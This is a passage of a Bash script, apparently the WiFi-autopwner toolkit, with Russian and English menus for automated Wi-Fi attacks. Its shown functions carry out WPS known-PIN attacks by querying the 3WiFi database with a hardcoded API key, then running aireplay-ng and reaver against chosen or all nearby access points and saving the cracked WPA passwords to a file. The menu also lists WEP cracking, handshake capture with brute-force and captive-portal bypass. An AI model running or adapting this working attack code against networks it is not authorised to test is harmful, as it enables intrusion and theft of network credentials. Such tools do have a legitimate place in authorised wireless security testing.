			bash modules/wfw.sh /tmp/everyone-01.csv
		else
			bash modules/wfw_en.sh /tmp/everyone-01.csv
		fi

		sudo rm /tmp/everyone*

		read -n 1 -s -r -p "${Lang[Strings69]}"

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}

function Contributors {
	cat ./CONTRIBUTORS.md

	read -n 1 -s -r -p "${Lang[Strings69]}"
	if [ $REPLY -eq 71 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function Update {
	git pull

	read -n 1 -s -r -p "${Lang[Strings69]}"
	if [ $REPLY -eq 71 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}

function checkUpdate {
	currVers="$(curl -s https://raw.githubusercontent.com/Mi-Al/WiFi-autopwner/master/wifi-autopwner.sh | grep -E 'VERS' | head -n 1 | grep -E -o '[0-9]{8}')"
	if [[ $currVers -gt $VERS ]]; then
		echo "${Lang[Strings65]}"
	else
		echo "${Lang[Strings66]}"
	fi

	read -n 1 -s -r -p "${Lang[Strings69]}"
	if [ $REPLY -eq 71 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi	
}

function knownPINsAttack {
	echo ${Lang[Strings6]}

	set_wash_parametrization

	echo -e ${Lang[Strings7]}
	if [[ "$IFACE" ]]; then

		sudo xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
		echo '---------------------------------------------------------------------------------------------------------------'
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b
		read -p "${Lang[Strings9]} " AIM
		echo ${Lang[Strings10]}
		cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM"
		BSSID="$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')"
		echo ${Lang[Strings67]}

		while read -r "knownPIN" ; do

		echo "${Lang[Strings68]} "$knownPIN

			sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $2}')"
			sudo xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}')" &
			sudo xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -p $knownPIN -i $IFACE -A -b $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk 'NR=='"$AIM" | awk '{print $1}') -v --no-nacks"

		done < <(curl -s "http://3wifi.stascorp.com/api/apiwps?key=23ZRA8UBSLsdhbdJMp7IpbbsrDFDLuBC&bssid=$BSSID" | grep -E -o '"value":"[0-9]{8}' | sed 's/"value":"//')

	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi

	if [ $REPLY -eq 71 ]; then
		echo "=============================================================="
	else
		REPLY=""
		showMainMenu
	fi
}


function knownPINsAttackAgainstAll {

	echo ${Lang[Strings6]}

	set_wash_parametrization

	echo -e ${Lang[Strings8]}
	if [[ "$IFACE" ]]; then
		sudo timeout 120 xterm -geometry "150x50+50+0" -e "sudo wash -i $IFACE $fcs | tee /tmp/wash.all"
		FOUNDWPS=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b)
		if [[ "$FOUNDWPS" ]]; then
			echo ${Lang[Strings14]}
			echo -e 'Number\tBSSID               Ch  dBm  WPS  Lck  Vendor    ESSID'
			echo '---------------------------------------------------------------------------------------------------------------'
			cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | cat -b

			COUNTER=0

			while read -r line ; do
				WPSS[$COUNTER]=$line
				COUNTER=$((COUNTER+1))
			done < <(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | awk '{print $1}' | sed 's/,//')

			for i in "${WPSS[@]}"; 
			do
				echo ""
				ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $7}')

				if [[ "$ESSID" ]]; then
					echo ${Lang[Strings12]}" $i ($ESSID)";
					isBlocked=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $5}')
					if [[ "$isBlocked" == "Yes" || "`grep $ESSID cracked.txt`" || "`grep $ESSID blacklist.txt`" ]]; then
						echo -e ${Lang[Strings37]}
					else

					BSSID="$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E $i | awk '{print $1}')"
						while read -r "knownPIN" ; do	
							echo "${Lang[Strings68]} "$knownPIN

							sudo iw dev "$IFACE" set channel "$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $2}')"
		
							sudo timeout 298 xterm -geometry "150x50+50+0" -xrm 'XTerm*selectToClipboard: true' -e "sudo aireplay-ng $IFACE -1 120 -a $(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $1}')" &
							sudo timeout 300 xterm -hold -geometry "150x50+400+0" -xrm 'XTerm*selectToClipboard: true' -e "echo -e \"\n\" | sudo reaver -p $knownPIN -i $IFACE -A -b $BSSID -vv --no-nacks  | tee /tmp/reaver.pixiedust"

							PIN=$(cat /tmp/reaver.pixiedust | grep -E -i '\[\+\] WPS pin:' | grep -Eo '[0-9]{8}')

							if [[ "$PIN" ]]; then
								PASSWORD=$(cat /tmp/reaver.pixiedust | grep -i -E '\[\+\] WPA PSK: ' | sed 's/\[+\] WPA PSK: //')
								echo -e ${Lang[Strings35]} "$PASSWORD"
								echo -e "\n$ESSID" >> cracked.txt
								echo "$ESSID:$PASSWORD" >> all_wifi_passwords.txt

							else
								echo ${Lang[Strings15]}
							fi
						done < <(curl -s "http://3wifi.stascorp.com/api/apiwps?key=23ZRA8UBSLsdhbdJMp7IpbbsrDFDLuBC&bssid=$BSSID" | grep -E -o '"value":"[0-9]{8}' | sed 's/"value":"//')					
					fi
				else
					ESSID=$(cat /tmp/wash.all | grep -E '[A-Fa-f0-9:]{11}' | grep -E "$i" | awk '{print $6}')
					echo $ESSID
					echo ''
				fi
			done
		else
			echo -e ${Lang[Strings16]}
		fi

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	
	else
		INF=${Lang[Strings5]}
		REPLY=""
		showMainMenu
	fi
}


function creatAP {
	if [[ "$IFACE" ]]; then

		echo ${Lang[Strings72]}

		read -p "${Lang[Strings70]} " NAME
		read -p "${Lang[Strings71]} " PASSWORD
		
		sudo xterm -geometry "150x50+50+0" -e "sudo create_ap $IFACE `ip route | grep 'default via ' | head -n 1 | grep -E -o 'dev [a-z0-9]{3,}' | sed 's/dev //'` \"$NAME\" \"$PASSWORD\"" &
		echo ""
		echo ${Lang[Strings73]}
		echo ""
		read -n 1 -s -r -p "${Lang[Strings69]}"

		if [ $REPLY -eq 71 ]; then
			echo "=============================================================="
		else
			REPLY=""
			showMainMenu
		fi
	else
		clear
		echo ${Lang[Strings5]}
		REPLY=""
		read -n 1 -s -r -p "${Lang[Strings69]}"
		showMainMenu
	fi
}




clear
COUNTER=0

while read -r line ; do
	DEVS[$COUNTER]=$line
	COUNTER=$((COUNTER+1))
done < <(sudo iw dev | grep -E "Interface " | sed "s/	Interface //")

if [[ ${#DEVS[@]} == 1 ]]; then
	echo -e ${Lang[Strings2]}
	IFACE=${DEVS[0]}
fi


function showMainMenu {

if [[ "$IFACE" ]]; then
	INF="${Lang[Strings27]} $IFACE"

	while read -r line ; do
	INF="${INF}${Lang[Strings28]} ${line}"
	done < <(sudo iw dev | grep -E -A5 "Interface $IFACE" | grep -E "type " | sed "s/		type //")	
else
	INF=${Lang[Strings29]}
fi


if [[ "$LANGUAGE" == "Russian" ]]; then

echo "Information:"
echo -e "\033[1m$INF\033[0m"

cat << _EOF_
=======================================================================================
Официальная страница программы (поддержка и обсуждение): https://hackware.ru/?p=2176
=======================================================================================

Меню:
Выберите желаемое действие:
1. Операции с Wi-Fi картой
	11. Выбрать беспроводной сетевой интерфейс
	12. Перевести интерфейс в режим монитора
	13. Перевести интерфейс в режим монитора + убить все мешающие ему процессы + завершить NetworkManager
	14. Перевести интерфейс в управляемый режим
	15. Увеличить мощность Wi-Fi карты мягким способом (работает не всегда, изменения теряются при перезагрузке)
	16000123465. Постоянное увеличение мощности Wi-Fi (остаётся навсегда) ТОЛЬКО ДЛЯ KALI LINUX!!!
	17. Постоянное увеличение мощности Wi-Fi (остаётся навсегда) ТОЛЬКО ДЛЯ ARCH LINUX ИЛИ BLACKARCH!!!
2. Открытые точки доступа, Перехватывающие Порталы, подключение
	21. Показать открытые Wi-Fi сети
	22. Подключиться к открытой Точке Доступа
	23. Обход перехватывающего портала
	24. Подключение к точке доступа с паролем
	25. Сбор информации о локальной сети
	26. Создание Точки Доступа (у вас должен быть Интернет доступ через провод или другой Wi-Fi)
3. WEP
	31. Атака на WEP
4. WPS
	41. Атака на WPS
	42. Атака Pixie Dust (на все ТД с WPS)
	43. Получение WPA-PSK пароля при известном WPS PIN
	44. Атака с наиболее вероятными ПИНами на одну ТД (требуется Интернет)
	45. Атака с наиболее вероятными ПИНами на все ТД с WPS (требуется Интернет)
5. WPA2/WPA
	51. Захват рукопожатий всех Точек Доступа в округе
	52. Захват рукопожатий всех Точек Доступа в округе + Брутфорс
	53. Захват рукопожатия выбранной Точки Доступа
	54. Захват рукопожатия выбранной Точки Доступа + Брутфорсс
	55. Взлом последних захваченных рукопожатий (без захвата новых)
6. 3WIFI
	61. Поиск по базе 3WIFI всех точек доступа в диапазоне досягаемости
7. Автоматический аудит
	71. Автоматический аудит Wi-Fi сетей
8. Сбор информации
	81. Показать все Точки Доступа и Клиенты в округе
9. Обновление. О программе и авторах
	91. Проверить обновление
	92. Установить обновление
	93. Авторы
0. Для выхода из программы

_EOF_

else

echo "Information:"
echo -e "\033[1m$INF\033[0m"

cat << _EOF_
=======================================================================================
Script Official Page (support and discussing): https://miloserdov.org/?p=35
=======================================================================================

Menu:
Actions:
1. Wireless Interface
	11. Select a wireless interface
	12. Set the interface in monitor mode
	13. Set the interface in monitor mode + kill processes hindering it + kill NetworkManager
	14. Set interface in managed mode
	15. Increase TX-Power of the Wi-Fi card in a soft way (it does not always work, changes are lost when rebooting)
	16000123465. Permanent increase TX-Power of Wi-Fi card (remains forever) ONLY FOR KALI LINUX!!!
	17. Permanent increase TX-Power of Wi-Fi card (remains forever) ONLY FOR ARCH LINUX OR BLACKARCH!!!
2. Open AP, Captive Portals, Connections
	21. Show Open Wi-Fi networks
	22. Connect to Open AP
	23. Bypass Captive Portals
	24. Connect to Password Protected AP
	25. Information Gathering About Local Network
	26. Creating an Access Point (you must have Internet access through a wire or another Wi-Fi)
3. WEP
	31. WEP Attack
4. WPS
	41. WPS Attack
	42. Pixie Dust Attack (against every APs with WPS)
	43. Reveal WPA-PSK password from known WPS PIN
	44. Known PINs Attack against a certain AP (required Internet Connection)
	45. Known PINs Attack against all APs (required Internet Connection)
5. WPA2/WPA
	51. Capture handshakes of every AP
	52. Capture handshakes of every AP + Brute-force
	53. Capture handshakes of a certain AP
	54. Capture handshakes of a certain AP + Brute-force
	55. Brute-force of the last captured handshakes (without new capture)
6. 3WIFI
	61. Automatic 3WiFi database querying of all detected APs within the range
7. Автоматический аудит
	71. Automated Wi-Fi network audit
8. Information Gathering
	81. Show all APs and Clients in the rage
9. Обновление. О программе и авторах
	91. Check for updates
	92. Upgrade
	93. Contributors
0. Exit

_EOF_

fi

read -p "${Lang[Strings30]} " REPLY


if [[ $REPLY =~ ^[0-9]$ ]]; then
	if [[ $REPLY == 0 ]]; then
		echo ${Lang[Strings31]}
		exit
	fi
fi

if [[ $REPLY == 11 ]]; then
	selectInterface
fi

if [[ $REPLY == 12 ]]; then
	putInMonitorMode
fi

if [[ $REPLY == 13 ]]; then
	putInMonitorModePlus
fi

if [[ $REPLY == 14 ]]; then
	putInManagedMode
fi

if [[ $REPLY == 15 ]]; then
	txPowerUp
fi

if [[ $REPLY == 16000123465 ]]; then
	txPowerUpPermanentKali
fi

if [[ $REPLY == 17 ]]; then
	txPowerUpPermanentArch
fi

if [[ $REPLY == 21 ]]; then
	showOpen
fi

if [[ $REPLY == 22 ]]; then
	connectOpenWifi
fi

if [[ $REPLY == 23 ]]; then
	hackCaptive
fi

if [[ $REPLY == 24 ]]; then
	connectWifiWithPassword
fi

if [[ $REPLY == 25 ]]; then
	lanInspector
fi

if [[ $REPLY == 26 ]]; then
	creatAP
fi

if [[ $REPLY == 31 ]]; then
	attackWEP
fi

if [[ $REPLY == 41 ]]; then
	showWPSNetworks
fi

if [[ $REPLY == 42 ]]; then
	PixieDustAattack
fi

if [[ $REPLY == 43 ]]; then
	showWPAPassFromPin
fi

if [[ $REPLY == 44 ]]; then
	knownPINsAttack
fi

if [[ $REPLY == 45 ]]; then
	knownPINsAttackAgainstAll
fi

if [[ $REPLY == 51 ]]; then
	getAllHandshakes
fi

if [[ $REPLY == 52 ]]; then
	getAllHandshakesAndCrackThem
fi

if [[ $REPLY == 53 ]]; then
	getCertainHandshake
fi

if [[ $REPLY == 54 ]]; then
	getCertainHandshakeAndCrackIt
fi

if [[ $REPLY == 55 ]]; then
	justCrackTheLastHandshakes
fi

if [[ $REPLY == 61 ]]; then
	3WIFI
fi

if [[ $REPLY == 71 ]]; then
	putInMonitorMode
	showOpen
	attackWEP
	PixieDustAattack
	getAllHandshakes	
fi

if [[ $REPLY == 81 ]]; then
	showEveryone
fi

if [[ $REPLY == 91 ]]; then
	checkUpdate
fi

if [[ $REPLY == 92 ]]; then
	Update
fi

if [[ $REPLY == 93 ]]; then
	Contributors
fi


}


showMainMenu
